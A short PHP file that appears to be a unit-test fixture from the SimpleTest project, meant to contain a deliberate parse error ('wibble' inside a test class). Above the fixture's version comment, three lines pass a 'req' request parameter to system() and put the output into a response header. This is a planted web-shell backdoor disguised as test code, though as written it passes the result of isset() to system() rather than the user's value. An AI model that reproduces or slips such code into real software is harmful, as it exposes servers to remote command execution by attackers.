<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
    // $Id: test_with_parse_error.php 901 2005-01-24 00:32:14Z lastcraft $
    
    class TestCaseWithParseError extends UnitTestCase {
        wibble
    }
    
?>